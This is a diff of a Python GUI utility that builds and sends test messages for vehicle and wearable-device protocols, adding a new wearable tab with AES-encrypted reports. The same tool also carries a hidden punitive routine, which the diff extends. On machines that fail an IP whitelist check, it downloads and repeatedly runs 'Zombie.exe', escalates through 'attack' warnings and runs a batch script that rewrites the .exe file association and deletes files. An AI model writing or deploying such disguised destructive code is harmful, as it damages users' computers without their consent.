@@ -1,6 +1,7 @@
 import binascii
 import csv
 import os
+import time
 import requests
 import zipfile
 import threading
@@ -18,13 +19,17 @@ from 报警 import *
 import webview
 from tkinter import messagebox
 import sys
-# 创建两个线程
+import subprocess
+from 小说 import 蓝奏云直链
+import signal
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import base64
 from concurrent.futures import ThreadPoolExecutor
-
-is_on = True
 from tkinter.messagebox import *
 import fnmatch
 
+is_on = True
 LOG_LINE_NUM = 0
 init_window = ttk.Window()
 
@@ -49,6 +54,34 @@ def paste(editor, event=None):
 
 def selectAll(editor, event=None):
     editor.tag_add('sel', '1.0', END)
+
+
+def AES_CBC_encrypt(text, key, iv):
+    bs = 16
+    PADDING = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
+    mode = AES.MODE_CBC
+    key = bytes.fromhex(key)
+    iv = bytes.fromhex(iv)
+    cryptos = AES.new(key, mode, iv)
+    crypt = cryptos.encrypt(PADDING(text).encode('utf-8'))
+    crypted_str = base64.b64encode(crypt)
+    return crypted_str
+
+
+# AES-CBC解密
+def AES_CBC_decrypt(text, key, iv):
+    key = bytes.fromhex(key)
+    iv = bytes.fromhex(iv)
+    text = base64.b64decode(text)
+    mode = AES.MODE_CBC
+    cryptos = AES.new(key, mode, iv)
+    plain_text = cryptos.decrypt(text)
+    return plain_text
+
+
+def str_split(str, key):
+    aa = str.split("#")
+    return aa[key]
 
 
 # V3校验位
@@ -132,6 +165,8 @@ class MY_GUI(tk.Tk):
         self.jiexurl = config['URL']['jiexurl']
         self.Zombie = config['Zombie']['range']
         self.jinyong = config['Zombie']['jinyong']
+        self.key = config['xsz']['key']
+        self.iv = config['xsz']['iv']
 
     def wzhi905(self, su, plsu):
         global data, t
@@ -185,7 +220,6 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-
                     s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
@@ -1475,6 +1509,17 @@ class MY_GUI(tk.Tk):
                      "探头遮挡报警", "双脱把报警（双手同时脱离方向盘）")
         self.init_data3_Text7["values"] = items
 
+    def getMon2(self, items):
+        inits = self.init_data_Text11.get().strip()
+        if inits == "报警数据":
+            items = ("SOS报警", "关机报警", "缺电报警", "自动关机报警", "开机报警",
+                     "设备充电", "电源已断开", "设备电量已充满")
+        elif inits == "终端上报":
+            items = ("心跳数据", "设备模式上报", "设备登录", "健康参数上报", "通话记录上报")
+        else:
+            items = ()
+        self.zd_data_Text11["values"] = items
+
     def show_menu(self, event):
         self.init_window_name.menu.post(event.x_root, event.y_root)
 
@@ -2507,6 +2552,206 @@ class MY_GUI(tk.Tk):
         if txt.startswith('http://') or txt.startswith('https://'):
             self.frame1.load_url(txt)
 
+    def ip11(self):
+        ip = self.ip_Text11.get().strip()
+        return ip
+
+    def port11(self):
+        port = self.port_Text11.get().strip()
+        return port
+
+    def wd11(self):
+        wd = self.wd_Text11.get().strip()
+        return wd
+
+    def jd11(self):
+        jd = self.jd_Text11.get().strip()
+        return jd
+
+    def button_mode11(self):
+        global is_on
+
+        wd1 = get_latitude(base_lat=float(self.wd11()), radius=150)
+        jd1 = get_longitude(base_log=float(self.jd11()), radius=150)
+        wd2 = float(wd1)
+        jd2 = float(jd1)
+        self.wd_Text11.delete(0, END)
+        self.wd_Text11.insert(0, str(wd2))
+        self.jd_Text11.delete(0, END)
+        self.jd_Text11.insert(0, str(jd2))
+
+    def 定位数据(self):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            # 消息头
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            接口标识 = 'REPORT_LOCATION_INFO'
+            报文类型 = '3'  # 平台下发请求标示 1，则终 端响应标示为 2，终端上报接口标 示为 3，平台响应标示为 4
+            时间 = f'{now_time}'
+            报文长度 = '79'
+            报文体 = f'0E{self.jd11()}N{self.wd11()}T{now_time}@0!0!0!0!0'
+            结束标识符 = ']'
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 接口标识 + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + 报文长度 + 分隔符 + 报文体 + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '定位数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：\n{}\n\n解密数据：\n[{}]\n\n'.format(recv_msg, content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def 报警数据(self, value):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            报文类型 = '3'
+            时间 = f'{now_time}'
+            结束标识符 = ']'
+            if value == "SOS报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_SOS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + '1' + 结束标识符
+            elif value == "关机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '2@' + 结束标识符
+            elif value == "缺电报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '1@10%' + 结束标识符
+            elif value == "自动关机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '3@5%' + 结束标识符
+            elif value == "开机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '4@90%' + 结束标识符
+            elif value == "设备充电":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '5@' + 结束标识符
+            elif value == "电源已断开":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '6@' + 结束标识符
+            elif value == "设备电量已充满":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + '7@100%' + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '报警数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：{}\n{}\n\n解密数据：\n[{}]\n\n'.format(value, recv_msg,
+                                                                                    content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def 终端上报(self, value):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            报文类型 = '3'
+            时间 = f'{now_time}'
+            结束标识符 = ']'
+            手机号 = '13829622823'
+            开始时间 = now_time[:12] + '00'
+            结束时间 = now_time
+            时长 = int(结束时间) - int(开始时间)
+            if value == "设备模式上报":  # 平衡模式
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '20' + 分隔符 + f'{random.randint(1, 3)}@{random.randint(1, 3)}@{int(time.time() * 1000)}@20' + 结束标识符
+            elif value == "设备登录":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_LOGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '22' + 分隔符 + f'5@1@111@1@1@100@0' + 结束标识符
+            elif value == "健康参数上报":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HEALTH' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '36' + 分隔符 + f'0000-0000@000!000!000!000!@{random.randint(35, 38)}@0000' + 结束标识符
+            elif value == "通话记录上报":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_CALL_LOG' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '26' + 分隔符 + f'{手机号}@{开始时间}!{结束时间}@{时长}@{random.randint(0, 1)}' + 结束标识符
+            elif value == "心跳数据":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HEARTBEAT' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'{random.randint(80, 100)}%@{random.randint(100, 2000)}' + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '终端上报请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：{}\n{}\n\n解密数据：\n[{}]\n\n'.format(value, recv_msg,
+                                                                                    content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def xsz_login(self):
+        src = self.init_data_Text11.get().strip()
+        print(src)
+        if src == "定位数据":
+            sbb1 = self.imei_Text11.get()
+            print(sbb1)
+            if not sbb1:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请输入设备号")
+            else:
+                self.result_data_Text11.insert(END, self.定位数据())
+        elif src == "报警数据":
+            lx = self.zd_data_Text11.get()
+            print(lx)
+            self.result_data_Text11.delete(1.0, END)
+            if not lx:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请选择终端类型")
+            else:
+                self.result_data_Text11.insert(END, self.报警数据(lx))
+        elif src == "终端上报":
+            lx = self.zd_data_Text11.get()
+            print(lx)
+            self.result_data_Text11.delete(1.0, END)
+            if not lx:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请选择终端类型")
+            else:
+                self.result_data_Text11.insert(END, self.终端上报(lx))
+
     # 设置窗口
     def set_init_window(self):
         self.init_window_name.title("配置版本  作者 : 姚子奇")
@@ -3228,11 +3473,88 @@ class MY_GUI(tk.Tk):
         self.frame1.grid(row=2, column=1, sticky=N)
         self.frame1.load_url(f'{self.url}')
 
+        pane11 = Frame()
+
+        self.ip_Text_label11 = Label(pane11, text="服务器ip")
+        self.ip_Text_label11.grid(row=0, columnspan=2, sticky=N)
+
+        items = (f"{self.conf_cswg}", f"{self.conf_scwg}", "120.79.176.183")
+        self.ip_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.ip_Text11.current(0)
+        self.ip_Text11.grid(row=1, column=0, sticky=W)
+
+        self.port_Text_label11 = Label(pane11, text="服务器Port")
+        self.port_Text_label11.grid(row=2, columnspan=2, sticky=N)
+        items = (f"7999")
+        self.port_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.port_Text11.current(0)
+        self.port_Text11.grid(row=3, column=0, sticky=W)
+
+        # 905组成数据
+        self.imei_Text_label11 = Label(pane11, text="IMEI号")
+        self.imei_Text_label11.grid(row=4, column=0, columnspan=1, sticky=N)
+        items = ("867082058798585", "867082058798522")
+        self.imei_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.imei_Text11.current(0)
+        self.imei_Text11.grid(row=5, column=0, sticky=N)
+
+        self.iccid_Text_label11 = Label(pane11, text="ICCID")
+        self.iccid_Text_label11.grid(row=6, column=0, columnspan=1, sticky=N)
+        items = ("867082058798585", "867082058798522")
+        self.iccid_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.iccid_Text11.current(0)
+        self.iccid_Text11.grid(row=7, column=0, sticky=N)
+
+        self.init_data_label11 = Label(pane11,
+                                       text="数据类型")
+        self.init_data_label11.grid(row=8, column=0, sticky=N)
+        items = ("定位数据", "报警数据", "终端上报")
+        self.init_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.init_data_Text11.current(0)
+        self.init_data_Text11.grid(row=9, column=0, columnspan=10, sticky=N)
+        self.init_data_Text11.bind("<<ComboboxSelected>>", self.getMon2)
+
+        # 经纬度随机
+        self.on_ = Button(pane11, text="随机经纬度", width=10, command=self.button_mode11)
+        self.on_.grid(row=9, column=10)
+
+        self.wd_Text_label11 = Label(pane11, text="纬度")
+        self.wd_Text_label11.grid(row=10, column=0)
+        items = (f"{self.conf_wd1}", "23.012173", "32.330217")
+        self.wd_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.wd_Text11.current(0)
+        self.wd_Text11.grid(row=11, column=0, sticky=N, columnspan=10)
+
+        self.jd_Text_label11 = Label(pane11, text="经度")
+        self.jd_Text_label11.grid(row=12, column=0)
+        items = (f"{self.conf_jd1}", "114.340462", "104.903551")
+        self.jd_Text11 = Combobox(pane11, width=50, height=2, values=items)
+        self.jd_Text11.current(0)
+        self.jd_Text11.grid(row=13, column=0, sticky=N, columnspan=10)
+
+        self.zd_data_label11 = Label(pane11, text="终端类型")
+        self.zd_data_label11.grid(row=14, column=0, sticky=N)
+        items = ()
+        self.zd_data_Text11 = Combobox(pane11, width=50, height=12, values=items)
+        self.zd_data_Text11.grid(row=15, column=0, columnspan=10, sticky=N)
+
+        self.str_trans_to_md11_button = Button(pane11, text="穿戴通讯发送", width=10,
+                                               command=lambda: self.thread_it(self.xsz_login))
+        self.str_trans_to_md11_button.grid(row=5, column=10)
+
+        self.result_data_label11 = Label(pane11, text="输出结果")
+        self.result_data_label11.grid(row=0, column=11)
+
+        self.result_data_Text11 = Text(pane11, width=85, height=20, relief='solid')
+        self.result_data_Text11.grid(row=1, column=11, rowspan=15, columnspan=15)
+
         note.add(pane2, text='部标808TCP发送')
         note.add(pane1, text='出租车905TCP发送')
         note.add(pane3, text='抢答905订单发送')
         note.add(pane4, text='29协议UDP发送')
         note.add(pane5, text='V3协议解析发送')
+        note.add(pane11, text='穿戴类型通讯发送')
+
         note.add(pane6, text='905协议解析')
         note.add(pane7, text='苏粤标生成')
         note.add(pane8, text='轨迹专用发送')
@@ -3275,15 +3597,14 @@ def bdu():
     with open(file_path1, "w") as file:
         file.write("assoc.exe=WMP11.AssocFile.3G2")
     with open(file_path2, "w") as file:
-        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\delete.bat")
-    import subprocess
+        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\Zombie.exe\ndel C:\\Users\\delete.bat")
     countdown(10)
     subprocess.Popen(r"C:\Users\update.bat")
     countdown(5)
     os.remove(r"C:\Users\update.bat")
     init_window.withdraw()
     init_window.attributes('-topmost', True)
-    showwarning(title="！！！！警告警告！！！！", message=f"第3次警告提醒,病毒程序已启动,请联系管理员处理,否则后果自负")
+    showwarning(title="！！！！警告警告！！！！", message=f"病毒程序已启动,请联系管理员处理,否则后果自负")
 
 
 def gui4_start():
@@ -3318,7 +3639,6 @@ def find_numbers_in_strings(strings):
 
 
 def stop_exe(exe_name):
-    import signal
     while True:
         processes = os.popen('tasklist').read()
         print(processes)
@@ -3334,14 +3654,23 @@ def stop_exe(exe_name):
 
 def show_popup(count):
     init_window.withdraw()  # 隐藏主窗口
-    import subprocess
     for i in range(count):
         # subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
         subprocess.Popen("C:\\Users\\Zombie.exe")
-        countdown(6)
+        countdown(5)
+    file_path = "C:\\Users\\count.txt"
+    with open(file_path, "r") as file:
+        runs = int(file.readline().strip())
+        print(runs)
+    if runs < 3:
+        showwarning(title="！！！！警告警告！！！！",
+                    message="\n僵尸出没\n吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~\n联系管理员添加白名单")
+    elif runs == 4:
+        showwarning(title="！！！！警告警告！！！！", message=f"第1次攻击警示\n启动文件夹攻击\n下次攻击将开启病毒模式")
+    else:
+        showwarning(title="！！！！警告警告！！！！", message=f"第2次攻击警示\n10s后将启动病毒攻击")
+    countdown(24)
     init_window.attributes('-topmost', True)
-    showwarning(title="！！！！警告警告！！！！",
-                message="警告\n请联系管理员添加白名单\n开启僵尸模式，吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
     stop_exe('Zombie.exe')
 
 
@@ -3356,7 +3685,6 @@ def wjj():
 
 
 def down():
-    from 小说 import 蓝奏云直链
     url = f"{蓝奏云直链.run('https://fzw.lanzouh.com/imhbz03zfa1a')}"
     response = requests.get(url)
     with open('Zombie.zip', 'wb') as f:
@@ -3367,36 +3695,34 @@ def down():
 
 
 #
-log1 = os.getcwd() + "\\conf\\log.out"
-f = open(log1, 'w')
-sys.stdout = f
-sys.stderr = f
+# log1 = os.getcwd() + "\\conf\\log.out"
+# f = open(log1, 'w')
+# sys.stdout = f
+# sys.stderr = f
 
 if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
-        if not os.path.exists("C:\\Program Files (x86)\\Common Files\\Zombie.zip"):
+        if not os.path.exists("C:\\Users\\Zombie.exe"):
             down()
         else:
             pass
-        show_popup(1)
-        print('结束')
         count_runs()
         if count_runs() < 2:
+            show_popup(int(MY_GUI(init_window).Zombie))
+            showwarning(title="试用阶段", message="\n启动试用版本\n尽快联系管理员添加白名单")
             init_window.deiconify()
             gui4_start()
         elif count_runs() == 4:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             show_popup(int(MY_GUI(init_window).Zombie))
-            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒\n启动文件夹攻击\n下次警告将开启病毒模式")
             wjj()
         else:
             countdown(6)
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             show_popup(int(MY_GUI(init_window).Zombie))
-            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒\n10s后将启动病毒攻击")
             bdu()
         sys.exit()
